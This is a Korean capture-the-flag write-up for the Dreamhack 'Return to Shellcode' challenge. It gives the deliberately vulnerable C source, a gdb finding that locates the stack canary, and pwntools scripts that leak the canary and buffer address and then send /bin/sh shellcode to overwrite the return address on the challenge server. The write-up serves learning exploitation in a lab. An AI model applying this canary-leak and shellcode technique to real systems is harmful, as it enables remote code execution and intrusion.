## Return to Shellcode
---

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

<br><br>

## Solution
---

gdb로 분석을 해보면 아래와 같은 코드가 있었다.

<br>

```
0x00000000000008d5 <+8>:     mov    rax,QWORD PTR fs:0x28
0x00000000000008de <+17>:    mov    QWORD PTR [rbp-0x8],rax
```

<br>

따라서 카나리 값은 ```rbp-0x8```에 위치한다.

그 다음 보면은 read로 읽을 때, 입력 값이 ```0x60```부터 받는다. 

buf와 rbp 거리도 96이라고 출력된다.

따라서 카나리 값을 읽기 위해서 입력값을 89만큼 입력해줘야 한다.

왜냐하면 카나리는 첫 바이트가 널바이트이므로 나머지 7바이트를 가져와야 한다.

<br>

```python
from pwn import *

p = process('./r2s')

context(arch='amd64', os='linux')

p.recvuntil(b'Input: ')

payload = b"A"*89

p.sendline(payload)

p.recvuntil(payload)

canary = u64(b"\0" + p.recv(7))
print("canary : ",hex(canary))
```

<br>

```canary :  0x325b0a27d8940a00``` 처럼 카나리 값이 나오게 된다.

이제 페이로드를 작성해줘야 한다.

코드를 보면 다시 buf를 gets 함수로 입력받으므로 buf에 쉘 코드를 넣고 buf의 나머지 부분을 채워준 다음 rbp-0x8에 카나리 값 8바이트를 채워주고 SFP는 아무 값으로 덮어쓰고 ret를 셸코드가 있는 buf 주소로 채워주면 된다. 

<br>

```python
from pwn import *

# p = process('./r2s')

p = remote('host3.dreamhack.games',18320)
context(arch='amd64', os='linux')

p.recvuntil(b'buf: ')
buf_addr = int(p.recv(14)[2:],16)
print("buf : ",buf_addr)

p.recvuntil(b'Input: ')
payload = b"A"*89

p.send(payload)
p.recvuntil(payload)

canary = u64(b"\0" + p.recv(7))
print("canary : ",hex(canary))

shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

# 또는 shellcode = asm(shellcraft.sh()) --> gets로 입력받아서 가능한 듯 

payload = shellcode + b"A"*(88-len(shellcode))+ p64(canary) + b"B"*0x8 + p64(buf_addr)

p.sendlineafter(b'Input: ',payload)
p.interactive()
```
